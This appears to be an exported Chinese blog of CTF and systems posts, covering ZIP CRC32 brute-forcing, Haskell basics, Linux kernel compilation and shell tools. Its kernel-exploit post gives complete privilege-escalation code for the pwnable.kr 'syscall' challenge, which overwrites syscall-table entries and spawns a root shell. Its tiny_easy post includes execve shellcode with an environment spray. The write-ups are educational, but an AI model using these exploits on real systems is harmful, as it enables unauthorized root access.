压缩，这里需要判断明文压缩后的CRC32是否与加密文件中的一致，若不一致可以换一个压缩工具。攻击过程如下：点击开始，很快就恢复了密码另：当明文的大小比较小时，攻击速度会比较慢；即使有时没有恢复密码，也可以使用明文攻击，最后点保存还是能得到压缩包里内容的。0x06. CRC32碰撞CRC32:CRC本身是“冗余校验码”的意思，CRC32则表示会产生一个32bit（8位十六进制数）的校验值。在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同的CRC32值，利用这个原理我们可以直接爆破出加密文件的内容还是以之前HBCTF伪加密那道题为例，另一种解法就是CRC32碰撞，打开压缩包，可以看出压缩文件 flag6位数的CRC32值为0x9c4d9a5d因此写出碰撞的脚本如下：1234567#coding:utf-8import binascii crc = 0x9c4d9a5dfor i in range(100000, 999999 + 1):#题目提示flag为6位数，因此只选择6位数字爆破 if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc: print i要特别注意if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff 。 脚本的运行结果如下，即为压缩文件的内容： 再举另一个bugku中的例子，下载下来的文件是68个压缩包，并且根据binwalk的检查结果，每个压缩包里都有一个大小为4个字节，名为out.txt的压缩文件 用如下的脚本碰撞出所有压缩包中的数据： 12345678910111213141516171819202122232425262728293031#coding:utf-8import zipfileimport stringimport binascii def CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s) &amp; 0xffffffff): #print s f.write(s) return def CrackZip(): for I in range(68): file = 'out' + str(I) + '.zip' f = zipfile.ZipFile(file, 'r') GetCrc = f.getinfo('data.txt') crc = GetCrc.CRC #以上3行为获取压缩包CRC32值的步骤 #print hex(crc) CrackCrc(crc) dic = string.ascii_letters + string.digits + '+/=' f = open('out.txt', 'w')CrackZip()f.close() 此题较为繁琐，之后的步骤不再展开 另：限于CPU的能力，CRC碰撞只能用于压缩文件较小的情况 笔者附：由于上述编写的代码速率不高，而且存在些许瑕疵，所以这里推荐使用工具https://github.com/theonlypwner/crc32 0x07. 修改格式 这种情况花样较多，难以做一个详细的总结，因此只列举最常见的缺少文件头或文件尾。 放一个zip文件格式讲的较清楚的链接，通过对zip文件格式的了解，可以解释之前伪加密的问题，同时也可以对缺少文件头或文件尾有更直观的认识。 如上为正常zip，缺头zip和缺尾zip的binwalk扫描结果，根据扫描结果用16进制编辑器添加文件头或文件尾，即可修复zip。 总结 Zip不仅是我们生活中常用到的一种文件格式，在CTF中也经常遇到，这里做了一个关于CTF中zip的总结，如果对读者有帮助，鄙人不胜荣幸。","tags":[{"name":"zip","slug":"zip","permalink":"http://yoursite.com/tags/zip/"}]},{"title":"haskell学习笔记——基本语法","date":"2017-10-14T16:11:49.000Z","path":"2017/10/15/haskell学习笔记——基本语法/","text":"挖了Haskell这个坑,希望在纯函数式环境锻炼自己的函数式编程思维首先来说一下环境,首先安装Haskell Platform也就是GHC推荐Mac下Haskell这个IDE,也可以在GHCI这样的REPL下练习话不多说,现在来学习一下Haskell的基本语法 参考： https://wiki.haskell.org/Haskell 文件执行方法1: 编译后执行 ghc --make hello ./hello 方法2：解释执行 ghci hello.hs 基本运算符Haskell中的基本运算符与其他语言类似 加 减 乘 除 + - * /1+1 布尔运算符 与 或 非 &amp;&amp; || notnot True 关系运算符 等于 不等 == /=not True == False 函数调用Haskell中的函数调用使用空格的方式succ 8succ单参数函数,返回一个数的后继min 8 9min返回较大的元素 可以用(数字1前的按键)将函数括起来作为中缀函数使用,如下 9 `div` 3 函数定义 函数式编程语言特点在Haskell这门纯函数式语言中,Haskell中只有定义没有赋值,已经定义的值是不能修改的,类似于数学中的变量,它的意义是这个变量代表了一个值,而非这个变量处在这个值的状态,所以说纯函数式编程中函数只能去引用数的计算结果,不会产生副作用,无论何时以同样的参数call函数都会获得一样的结果,所以函数很适合作为first class, 获得与其他语言中变量同等的地位 let关键词用于声明常量12345678let doubleMe x = x + xdoubleMe 2let doubleUs x y = &#123;- 在函数中定义函数 -&#125; let doublex = 2 * x doubley = 2 * y in doublex + doubley 可以在函数中调用其他函数 12let doubleUs x y = doubleMe x + doubleMe ydoubleUs 2 3 基本语句if then else语句Haskell中if语句实际上是一个表达式每个if都要有thenelse两部分,else不是可选的,这也就保证了表达式一定有其返回值 123let doubelSmallNumber x = if x &gt; 100 then x else doubleMe x Haskell中常在函数名后加单引号&#39;来区分一个相似的函数 case语句case语句可以用来进行多值匹配 123let isOneOrTwo x = case x of 1 -&gt; &quot;1:One&quot; 2 -&gt; &quot;2:No Two&quot; otherwise -&gt; &quot;otherwise&quot; where语句where语句其实是对变量的定义 123let doubleUs x y = doublex + doubley where doublex = 2 * x doubley = 2 * y 模式匹配12345678let lucky 7 = &quot;You are lucky&quot;let lucky x = &quot;Sorry, you are not lucky&quot;lucky 7lucky 8--另例foo 0 x = x + 1foo 1 x = x - 1foo 2 x = 0 上例表明：如果lucky 7，就返回&quot;You are lucky&quot;，否则&quot;Sorry, you are not lucky&quot; guard有时，模式匹配单独无法有效描述一个函数，引入一个称为guard的模式，如果这个模式匹配，每个guard的测试表达式将按顺序检查，如果测试表达式匹配，guard的值将被使用。 Guard开始使用 | ，后面是一个测试表达式，其返回结果或真或假，后面跟着 =，然后是返回的值，otherwise能够捕获其他所有情况。 12345let mydiv x y | y == 0 = &quot;Can not divide&quot; | x / y &gt; 10 = &quot;first number is larger than the second number&quot; | x / y &lt; 1 = &quot;first number is less than the second number&quot; | otherwise = &quot;almost equal&quot; 递归12345--配合guardlet mysum x y | x &gt; y = mysum y x | x == y = x | otherwise = x + mysum (x+1) y 模式匹配与guard的区别:区别就在于一个对比的是对象，一个对比的是布尔值。 函数定义下面是我们定义一个函数addone，输入参数是整数，输出也是整数： 12addOne :: Integer -&gt; IntegeraddOne n = n + 1 第一行是我们定义一个函数名称为addOne，这个函数有一个Integer参数，返回一个Integer。第二行表示对于我们函数的任何输入，我们将把这个输入表示为n，那么我们将返回n+1。 注意，这里 = 是数学中的意义，在我们程序中任何地方有addOne n，我们能够使用n+1来替代它，得到的都是精确同样的结果，这其实是引用透明的案例，因为我们的函数对于任何给定输入总是返回同样的值。 addOne 10返回11 调用这个函数的方式是函数名称后跟着参数，之间都是有空格分开，没有任何逗号和括号， 函数与模式匹配让我们定义另外一个函数，它是对于输入一个姓氏能够输出其姓名: 1234lastName :: String -&gt; StringlastName &quot;anthony&quot; = &quot;gillis&quot;lastName &quot;michelle&quot; = &quot;jocasta&quot;lastName &quot;gregory&quot; = &quot;tragos&quot; Haskell函数定义依赖于模式匹配，如果你使用参数&quot;anthony&quot;调用lastName函数，，那么函数就会返回字符串&quot;gillis&quot;，如果你使用&quot;michelle&quot;，那么就会返回&quot;jocasta&quot; 但是如果我们输入一个在这三个中不存在姓呢？ lastName &quot;bob&quot; 就会得到一个exception: Non-exhaustive patterns in function lastName。这是因为我们的函数不是total，它并没有对于每个可能的输入有一个定义好的输出，通常函数应该是无论任何可能都是确定的，那么我们重新定义函数如下： lastName :: String -&gt; StringlastName &quot;anthony&quot; = &quot;gillis&quot;lastName &quot;michelle&quot; = &quot;jocasta&quot;lastName &quot;gregory&quot; = &quot;tragos&quot;lastName n = &quot;&quot; 现在我们的函数是total了，最后一个会捕获所有情况，如果上面三个不匹配，那么最后一个总是将参数绑定到n，我们能够使用_ 来代表n 表示我们其实不关心其值。 多个参数函数让我们定义一个函数areAscending，它有三个整数参数，如果它们是严格递增那么就返回真： 12areAscending :: Integer -&gt; Integer -&gt; Integer -&gt; BoolareAscending a b c = a &lt; b &amp;&amp; b &lt; c 我们的类型语法看上去是不是有点奇怪？参数之间有箭头，且返回一个值类型？这种多参数函数称为curried，柯里化是将多个参数的一个函数作为输入，转入一系列只有一个参数的函数，返回另外一个函数，比如用伪Swift代码如下： myFunc(a: A, b: B, c: C) -&gt; Z 函数func1(a: A)当被调用时，返回一个函数func2(b: B)，它又返回一个函数func3(c: C)，它被调用最后返回Z类型结果。 请注意，在我们的模式匹配中，我们分配第一个参数到a，第二个是b，第三个是c，这样我们能够在=后面使用它们来执行我们的计算： 12345areAscending 1 2 3-- = TrueareAscending 3 4 2-- = False 如果我们希望使用一个表达式调用这个函数，而不是一个个参数遍历，那么我们需要使用括号包围： 12areAscending 1 (1 + 1) 3-- = True 而没有括号的areAscending 1 1 + 1 3则被解释为(areAscending 1 1) + (1 3)，这是没有意义。 零参数函数如果参数没有怎么办？零参数函数也是一个函数，总是返回一个值，这又是引用透明的原理了，因为只有一个办法调用无参数函数，这个函数也总是返回一个值： 123someValue :: StringsomeValue = &quot;hello world&quot; 零参数函数类似于常量，只要看到someValue，我们都可以使用&quot;hello world&quot;来替代，这正是我们从一个常量中应该预期到结果。 绑定Binding与变量不可变Haskell使用=实现绑定，前面我们说=是引用透明的案例，是一种数学意义，实际是将两者绑定了。 Binding名称不能大写，绑定可以定义一个或多个参数的函数，函数和参数使用空格，这是Haskell区别其他语言的简洁之处 括号可以包装复合表达式，当然也可以使用\\$符号 与命令式语言变量不同,Haskell绑定变量 不可变的 特点有两个： order-independent ——绑定在源代码的顺序并不重要 Lazy懒赋值 ——定义变量只在需要的时候进行赋值 此外，变量名的scope是只在自己定义的范围内递归的 表达式和绑定都有一个类型 Bool - 有两个元素： True 或 False Char - unicode符合集合 Int - 固定大小整数 Integer - 无限大小整数 Double - IEEE 浮点数字 type1 -&gt; type2 - 一个输入类型type1 到输出类型 type2的函数 (type1, type2, ..., typeN) - 类型数组tuple () - 零数组tuple, 称为unit (类似C的void); 这个类型只有一个值：空。 Monoid首先，需要了解什么是Monoid。在形式语言与自动机中有介绍！在Haskell中，表达三个函数的Monoid可以如下表达： 12add :: Integer -&gt; (Integer -&gt; Integer)add arg1 arg2 = arg1 + arg2 这里使用括号，其实这个Monoid符合结合律，括号是没有必要的，等同于如下： 1add :: Integer -&gt; Integer -&gt; Integer Lambda抽象 你可以通过lambda实现匿名函数 符号是： \\variable(s) -&gt; body ( \\被称为&quot;lambda&quot;) 案例: 12countLowercaseAndDigits :: String -&gt; IntcountLowercaseAndDigits = length . filter (\\c -&gt; isLower c || isDigit c) lambda使用模式匹配能够分解值： 1... (\\(Right x) -&gt; x) ... But note that guards or multiple bindings are not allowed Patterns must have the right constructor or will get run-time error","tags":[{"name":"haskell","slug":"haskell","permalink":"http://yoursite.com/tags/haskell/"}]},{"title":"kernel exploit简介","date":"2017-10-14T11:16:25.000Z","path":"2017/10/14/kernel-exploit简介/","text":"1、Linux内核exploit介绍在linux下，整个内存空间中，只有一部分低地址是进程可访问的，而高地址处则是属于内核。例如，在x86的机器上，0x00000000到0xbfffffff是属于进程的，而0xc0000000到0xffffffff这1 GB是属于内核的。 出于安全考虑，进程无法访问属于内核的内存，否则恶意进程就有可能对系统内核的内存进行读取或者篡改。反过来，属于进程的内存，是可以被内核访问的。特别地，在内核太可以跳转执行用户空间中的代码。（不过，在某些硬件上，比如较新的Core CPU，Intel加入了SMEP等保护功能，限制了内核执行用户空间代码的操作） 内核空间的exploit，本质上与用户空间的exploit是相同的：都是修改执行流程，达到我们的目的。一般来说，用户空间的exploit，其目的是获取shell；而内核空间的exploit，其目的则是提升权限，获取对系统的完全控制。 Linux系统下，每个进程拥有其对应的struct cred，用于记录该进程的uid。内核exploit的目的，便是修改当前进程的cred，从而提升权限。当然，进程本身是无法篡改自己的cred的，我们需要在内核空间中，通过以下方式来达到这一目的： 1commit_creds(prepare_kernel_cred(0)); 其中，prepare_kernel_cred()创建一个新的cred，参数为0则将cred中的uid, gid设置为0，对应于root用户。随后，commit_creds()将这个cred应用于当前进程。此时，进程便提升到了root权限。 这些方法的地址，可以通过/proc/kallsyms获取。不过，有时为了安全，管理员会隐藏内核符号的地址，此时便无法通过这一方式获取地址。 提升权限后，我们还需要返回到用户空间。在这里，我们可以运行shell，从而以root身份执行任意命令了。 2、范例——pwnable.kr: syscall在pwnable.kr上有一道题，syscall，就可以作为内核exploit的入门 其中将syscall.c编译进了内核 1234567891011121314151617181920212223242526272829303132333435363738394041424344// adding a new system call : sys_upper#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/slab.h&gt;#include &lt;linux/vmalloc.h&gt;#include &lt;linux/mm.h&gt;#include &lt;asm/unistd.h&gt;#include &lt;asm/page.h&gt;#include &lt;linux/syscalls.h&gt;#define SYS_CALL_TABLE 0x8000e348 // manually configure this address!!#define NR_SYS_UNUSED 223//Pointers to re-mapped writable pagesunsigned int** sct;asmlinkage long sys_upper(char *in, char* out)&#123; int len = strlen(in); int i; for(i=0; i&lt;len; i++)&#123; if(in[i]&gt;=0x61 &amp;&amp; in[i]&lt;=0x7a)&#123; out[i] = in[i] - 0x20; &#125; else&#123; out[i] = in[i]; &#125; &#125; return 0;&#125;static int __init initmodule(void )&#123; sct = (unsigned int**)SYS_CALL_TABLE; sct[NR_SYS_UNUSED] = sys_upper; printk(&quot;sys_upper(number : 223) is added\\n&quot;); return 0;&#125;static void __exit exitmodule(void )&#123; return;&#125;module_init( initmodule );module_exit( exitmodule ); 2.1 问题分析你会发现这道题目提供了一个编写的内核模块源码，其中添加了一个syscall，其执行的逻辑基本与strcpy()相同，只是会将小写字母变为大写字母。 那么，这里的漏洞就很明显了，基本上就是一个向任意地址写任意内容的漏洞，只要写入的内容不包含小写字母。接下来，就是如何利用这个syscall，获取root权限，从而读取flag文件。 系统调用的地址存在0x8000e348+223 = 0x8000e6c4, flag在/root/flag 2.2 解题思路首先修改 223 号系统调用的内容，然后调用这个修改过的 223 号系统调用，在 kernel space 把 uid 改掉，之后在 user space execve()就好了。 2.3 解题步骤在现在版本的 Linux 内核修改 uid，需要通过prepare_creds()和commit_creds()两步参考2。这两个函数的地址存在/proc/kallsyms: 1234$ cat /proc/kallsyms | grep &apos;prepare_creds\\|commit_creds&apos;8003f44c T prepare_creds8003f56c T commit_creds... 参考 @acama 的版本 参考3写了一个( @acama 的版本prepare_creds()之后直接就commit_creds(), 这估计只在老版本可以).prepare_creds()返回的结构体定义可以看参考4. 12345678910111213141516171819202122232425262728@ prepare_creds and commit_creds.section .text.global _start_start: push &#123;lr&#125; mov r0, #0 ldr r3, =0x8003f44c @ prepare_creds() blx r3 push &#123;r0&#125; sub r1, r1, r1 add r0, #4 str r1, [r0], #4 @ set uid, euid, gid, etc str r1, [r0], #4 str r1, [r0], #4 str r1, [r0], #4 str r1, [r0], #4 str r1, [r0], #4 str r1, [r0], #4 str r1, [r0], #4 pop &#123;r0&#125; ldr r3, =0x8003f56c @ commit_creds(r0) blx r3 pop &#123;lr&#125; bx lr 这个生成的指令是不能用原先的 223 号系统调用直接写进内存的，所以我准备了一个真正的write-anything-anywhere的跳板: 12345678910111213@ Write anything anywhere.section .text.global _start_start:lp: ldrb r3, [r0], #1 strb r3, [r1], #1 subs r2, r2, #1 bge lp bx lr 先把 waa 写进内存，然后把 cred 写进内存。至于写到哪里，我随手写了两个地址: 0x83f5cafe, 0x83f6beee. 2.4 exp集锦参考: https://cubarco.org/blog/2015/12/writeup-pwnable-syscall/ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;char cred[] = &quot;\\x04\\xe0\\x2d\\xe5\\x00\\x00\\xa0\\xe3\\x40\\x30\\x9f\\xe5\\x33\\xff\\x2f\\xe1\\x04\\x00\\x2d\\xe5\\x01\\x10\\x41\\xe0\\x04\\x00\\x80\\xe2\\x04\\x10\\x80\\xe4\\x04\\x10\\x80\\xe4\\x04\\x10\\x80\\xe4\\x04\\x10\\x80\\xe4\\x04\\x10\\x80\\xe4\\x04\\x10\\x80\\xe4\\x04\\x10\\x80\\xe4\\x04\\x10\\x80\\xe4\\x04\\x00\\x9d\\xe4\\x0c\\x30\\x9f\\xe5\\x33\\xff\\x2f\\xe1\\x04\\xe0\\x9d\\xe4\\x1e\\xff\\x2f\\xe1\\x4c\\xf4\\x03\\x80\\x6c\\xf5\\x03\\x80&quot;;char waa[] = &quot;\\x01\\x30\\xd0\\xe4\\x01\\x30\\xc1\\xe4\\x01\\x20\\x52\\xe2\\xfb\\xff\\xff\\xaa\\x1e\\xff\\x2f\\xe1&quot;;char addr1[] = &quot;\\xfe\\xca\\xf5\\x83&quot;;char addr2[] = &quot;\\xee\\xbe\\xf6\\x83&quot;;int ret;int main()&#123; asm volatile ( &quot;mov r0, %1\\n&quot; &quot;mov r1, %2\\n&quot; &quot;mov r7, #223\\n&quot; &quot;svc #0\\n&quot; &quot;mov r0, %3\\n&quot; &quot;mov r1, %4\\n&quot; &quot;mov r7, #223\\n&quot; &quot;svc #0\\n&quot; &quot;mov %0, r0&quot; : &quot;=r&quot; (ret) : &quot;r&quot; (waa), &quot;r&quot; (0x83f5cafe), &quot;r&quot; (addr1), &quot;r&quot; (0x8000e6c4) : &quot;r0&quot;, &quot;r1&quot;, &quot;r2&quot;, &quot;r3&quot;, &quot;lr&quot; ); printf(&quot;return value: %x\\n&quot;, ret); asm volatile ( &quot;mov r0, %1\\n&quot; &quot;mov r1, %2\\n&quot; &quot;mov r2, %3\\n&quot; &quot;mov r7, #223\\n&quot; &quot;svc #0\\n&quot; &quot;mov r0, %4\\n&quot; &quot;mov r1, %5\\n&quot; &quot;mov r2, %6\\n&quot; &quot;mov r7, #223\\n&quot; &quot;svc #0\\n&quot; &quot;mov %0, r0&quot; : &quot;=r&quot; (ret) : &quot;r&quot; (cred), &quot;r&quot; (0x83f6beee), &quot;r&quot; (89), &quot;r&quot; (addr2), &quot;r&quot; (0x8000e6c4), &quot;r&quot; (5), &quot;r&quot; (0) : &quot;r0&quot;, &quot;r1&quot;, &quot;r2&quot;, &quot;r3&quot;, &quot;r5&quot;, &quot;lr&quot; ); printf(&quot;return value: %x\\n&quot;, ret); asm volatile ( &quot;mov r7, #223\\n&quot; &quot;svc #0\\n&quot; &quot;mov %0, r0&quot; : &quot;=r&quot; (ret) : : &quot;r0&quot;, &quot;r1&quot;, &quot;r3&quot;, &quot;lr&quot; ); execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL); return 0;&#125; 参考: http://w0lfzhang.me/2017/04/27/pwnable-syscall/ 123456789101112131415161718192021222324252627//gcc -o solver solver.c -std=c99#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#define SYS_CALL_TABLE 0x8000e348#define PREPARE_KERNEL_CRED 0x8003f924//0x8003f56c &apos;6c&apos; is low_case, so adding padding to &apos;60&apos;#define COMMIT_CREDS 0x8003f560#define SYS_EMPTY_A 188#define SYS_EMPTY_B 189int main() &#123; unsigned int* sct = (unsigned int*)SYS_CALL_TABLE; char nop[] = &quot;\\x01\\x10\\xa0\\xe1&quot;; //rasm2 -a arm &apos;mov r1,r1&apos; char buf[20]; for (int i = 0; i &lt; 12; i++) &#123; buf[i] = nop[i % 4]; &#125; buf[12] = 0; syscall(223, buf, COMMIT_CREDS); puts(&quot;Stage 1 - add padding&quot;); syscall(223, &quot;\\x24\\xf9\\x03\\x80&quot;, sct + SYS_EMPTY_A); syscall(223, &quot;\\x60\\xf5\\x03\\x80&quot;, sct + SYS_EMPTY_B); puts(&quot;Stage 2 - overwrite syscall table&quot;); syscall(SYS_EMPTY_B, syscall(SYS_EMPTY_A, 0)); puts(&quot;Stage 3 - set new cred&quot;); system(&quot;/bin/sh&quot;); return 0;&#125;","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"kernel","slug":"kernel","permalink":"http://yoursite.com/tags/kernel/"}]},{"title":"Linux内核编译","date":"2017-10-13T17:10:40.000Z","path":"2017/10/14/Linux内核编译/","text":"Linux内核是操作系统的核心，也是操作系统最基本的部分。 Linux内核的体积结构是单内核的、但是他充分采用了微内核的设计思想、使得虽然是单内核、但工作在模块化的方式下、并且这个模块可以动态装载或卸 载；Linux负责管理系统的进程、内存、设备驱动程序、文件和网络系统，决定着系统的性能和稳定性。如是我们在了解Linux内核的基础上根据自己的需 要、量身定制一个更高效，更稳定的内核，就需要我们手动去编译和配置内核里的各项相关的参数和信息了。注意：如果两个内核模块的版本不完全相同是不可以跨版本使用的。 1、编译内核1.1 下载并解压内核文件 首先我们要去获得Linux内核的压缩文件、获得的路径很多了、最直接的就是去内核官网获得了(http://www.kernel.org)，也可以到各镜像站上去下载。此处使用的是[https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz](https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.xz) 注意：一般而言，需要编译的linux内核的源码放在/usr/src目录下。 wget https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.16.tar.gzsudo tar -zxvf linux-3.16.tar.gz -C /usr/src/ 1.2 编译前准备需要确保系统安装了gcc，ncurses，bc，make，并且系统包需要更新到最新版 sudo apt-get install gccsudo apt-get install libncurses5-devsudo apt-get updatesudo apt-get upgradesudo apt-get install makesudo apt-get install bc 1.3 配置内核方法很多，比较常用的是 make menuconfig make 12345678910make config：遍历选择所要编译的内核特性make allyesconfig：配置所有可编译的内核特性make allnoconfig：并不是所有的都不编译，而是能选的都回答为NO、只有必须的都选择为yes。make menuconfig：这种就是打开一个文件窗口选择菜单，这个命令需要打开的窗口大于80字符的宽度，打开后就可以在里面选择要编译的项了下面两个是可以用鼠标点选择的，比较方便：make kconfig(KDE桌面环境下，并且安装了qt开发环境)make gconfig(Gnome桌面环境，并且安装gtk开发环境)make menuconfig：使用这个命令的话，如果是新安装的系统就要安装gcc和ncurses-devel这两个包才可以打开，然后在里面选择就可以了。此方法使用较多 1.4 安装或更新内核 make modules_install install 如果/boot目录下有下面 1234System.map-3.16.0vmlinuz-3.16.0initrd.img-3.16.0config-3.16.0 代表已经成功编译了。 重启系统 shutdown -r now 1.5 验证 uname -r 查看内核是否发生改变 2、 向内核中添加自定义的syscall函数这部分参考的是文章 Adding a Hello World System Call to Linux kernel 3.16.0 2.1 下载并解压内核文件2.2 定义新的系统函数sys_helloa) 创建hello.c文件 cd /usr/src/linux-3.16 mkdir hello cd hello vim hello.c /usr/src/linux-3.16/hello/hello.c 1234567#include &lt;linux/kernel.h&gt;asmlinkage long sys_hello(void)&#123; printk(\"Hello world\\n\"); return 0;&#125; b) 创建Makefile vim Makefile /usr/src/linux-3.16/hello/Makefile 1obj-y := hello.o c) 修改内核的Makefile 修改linux-3.16文件目录下的Makefile，将842行的&quot;core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ &quot; 修改为&quot;core-y += kernel/ mm/ fs/ ipc/ security/ crypto/ block/ hello/&quot; d) 修改syscall_32.tbl文件（如果是64位系统，就应该修改syscall\\_64.tbl） cd arch/x86/syscalls vim syscall_32.tbl 在接近末尾处，添加一行 1354 i386 hello sys_hello 其中354指的是系统调用号，i386指的是系统类型，sys_hello指的是系统函数 e) 修改对应的头文件syscalls.h cd include/linux/ vim syscalls.h 在末尾处，添加一行 1asmlinkage long sys_hello(void); 2.3 编译前准备2.4 配置内核2.5 安装或更新内核2.6 检验系统调用函数是否成功编译随便写一个test.c文件 12345678910#include &lt;stdio.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;unistd.h&gt;int main()&#123; long int amma = syscall(354); printf(\"System call sys_hello returned %ld\\n\", amma); return 0;&#125; 如果内核编译正确的话，程序返回的是&quot;System call sys_hello returned 0&quot; 通过dmesg命令可以查看内核信息，发现&quot;Hello world&quot;","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"kernel","slug":"kernel","permalink":"http://yoursite.com/tags/kernel/"}]},{"title":"程序执行中我们所忽略的事","date":"2017-09-30T16:13:10.000Z","path":"2017/10/01/程序执行中我们所忽略的事/","text":"1、程序执行时argv[0]一定会是程序名或者程序绝对路径吗？这个问题可能让绝大多数人困惑，因为我们所看到的基本上都符合这个结论。那什么情况下不符合呢？ 这就不得不提到我做过的pwnable.kr上的tiny_easy一题了 I made a pretty difficult pwn task.However I also made a dumb rookie mistake and made it too easy :(This is based on real event :) enjoy. ssh tiny_easy@pwnable.kr -p2222 (pw:guest) 程序主体就一下几行: pop eaxpop edxmov edx, [edx]call edx 那么eax其实是参数个数，而edx则是argv[0]所在字符串的前4位组成的32位地址 exp.py 1234567891011121314151617#!/usr/bin/pythonimport osimport subprocessjumpto = \"\\xb0\\xaf\\xb5\\xff\"shellcode = \"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\"nopsled = \"\\x90\"*4096;payload = nopsled+shellcodemyenv = &#123;&#125;# Arbitrary largeish numberfor i in range(0,100): myenv[\"spray\"+str(i)] = payloadwhile True: p = subprocess.Popen([jumpto], executable=\"tiny_easy\", env=myenv) p.wait() 脚本很简单，利用的是类堆喷的方法。 这里subprocess.Popen(args, executable=None, env=None) 其实args这个list中的第一个参数是argv[0]，而执行的程序则是executable对应的elf文件。可以发现用户可以控制程序执行时argv[0] 当然除了subprocess有这个功能，pwntools中pwnlib.tubes.process.process(args, shell = False, executable = None, env = None, timeout = &#39;default&#39;, log_level = INFO)也可以有类似的操作","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"shell命令解析","date":"2017-09-30T08:14:22.000Z","path":"2017/09/30/shell命令解析/","text":"此标题范围广，内容多，不易梳理清楚。本人也因为能力有限，不可能面面俱到，只能讲讲在ctf中可能会遇到的一些命令。 1. checksec它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。 1234567$ checksec tiny_easy[*] &apos;/tmp/tiny_easy&apos; Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) 2. ldd用来查看程序运行所需的共享库,常用来解决程序因缺少某个库文件而不能运行的一些问题。 1234$ ldd ascii_easy linux-gate.so.1 =&gt; (0xf7765000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf7591000) /lib/ld-linux.so.2 (0x56565000) 3. export设置全局变量 12345$ export PATH=/tmp/test:$PATH$ echo $PATH # 输出某个全局变量，没有的话就输出一行空串$ env # 查看所有全局变量$ set # 显示所有本地定义的Shell变量$ unset PATH # 清除环境变量 export是设置的临时全局变量，在关闭shell之后就自动清除了； 而如果修改文件/etc/bashrc和/etc/profile，那这个改变就会是永久的。 4. ldconfigldconfig是一个动态链接库管理命令。 123$ export LD_LIBRARY_PATH=/tmp/test$ ldconfig$ ldd ascii_easy 最后没有正确链接上，可能的原因是因为本机与那个动态链接库不兼容导致！ 5. stracestrace常用来跟踪进程执行时的系统调用和所接收的信号。 在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备(比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。 123456789101112131415161718192021222324252627282930313233343536-c 统计每一系统调用的所执行的时间,次数和出错的次数等. -d 输出strace关于标准错误的调试信息. -f 跟踪由fork调用所产生的子进程. -ff 如果提供-o filename,则所有进程的跟踪结果输出到相应的filename.pid中,pid是各进程的进程号. -F 尝试跟踪vfork调用.在-f时,vfork不被跟踪. -h 输出简要的帮助信息. -i 输出系统调用的入口指针. -q 禁止输出关于脱离的消息. -r 打印出相对时间关于,,每一个系统调用. -t 在输出中的每一行前加上时间信息. -tt 在输出中的每一行前加上时间信息,微秒级. -ttt 微秒级输出,以秒了表示时间. -T 显示每一调用所耗的时间. -v 输出所有的系统调用.一些调用关于环境变量,状态,输入输出等调用由于使用频繁,默认不输出. -V 输出strace的版本信息. -x 以十六进制形式输出非标准字符串 -xx 所有字符串以十六进制形式输出. -a column 设置返回值的输出位置.默认 为40. -e expr 指定一个表达式,用来控制如何跟踪.格式如下: [qualifier=][!]value1[,value2]... qualifier只能是 trace,abbrev,verbose,raw,signal,read,write其中之一.value是用来限定的符号或数字.默认的 qualifier是 trace.感叹号是否定符号.例如: -eopen等价于 -e trace=open,表示只跟踪open调用.而-etrace!=open表示跟踪除了open以外的其他调用.有两个特殊的符号 all 和 none. 注意有些shell使用!来执行历史记录里的命令,所以要使用\\\\. -e trace=set 只跟踪指定的系统 调用.例如:-e trace=open,close,rean,write表示只跟踪这四个系统调用.默认的为set=all. -e trace=file 只跟踪有关文件操作的系统调用. -e trace=process 只跟踪有关进程控制的系统调用. -e trace=network 跟踪与网络有关的所有系统调用. -e strace=signal 跟踪所有与系统信号有关的 系统调用 -e trace=ipc 跟踪所有与进程通讯有关的系统调用 -e abbrev=set 设定 strace输出的系统调用的结果集.-v 等与 abbrev=none.默认为abbrev=all. -e raw=set 将指 定的系统调用的参数以十六进制显示. -e signal=set 指定跟踪的系统信号.默认为all.如 signal=!SIGIO(或者signal=!io),表示不跟踪SIGIO信号. -e read=set 输出从指定文件中读出 的数据.例如: -e read=3,5 -e write=set 输出写入到指定文件中的数据. -o filename 将strace的输出写入文件filename -p pid 跟踪指定的进程pid. -s strsize 指定输出的字符串的最大长度.默认为32.文件名一直全部输出. -u username 以username 的UID和GID执行被跟踪的命令 strace -if elfname 一般而言会返回 execve(elf绝对路径， elf绝对路径，其他) 但是，如果elf所在目录被加入PATH全局变量，返回的就是 